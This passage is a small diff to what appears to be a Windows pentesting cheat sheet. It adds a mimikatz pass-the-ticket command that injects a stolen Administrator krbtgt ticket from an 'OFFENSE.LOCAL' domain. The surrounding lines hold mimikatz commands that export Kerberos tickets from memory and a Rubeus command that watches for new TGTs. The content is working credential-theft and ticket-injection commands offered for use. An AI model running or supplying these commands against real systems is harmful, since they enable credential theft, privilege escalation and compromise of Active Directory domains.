@@ -213,6 +213,8 @@ privilege::debug
 sekurlsa::tickets /export #Recommended way
 kerberos::list /export #Another way
 
+kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
+
 # Monitor logins and export new tickets
 .\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs
 ```
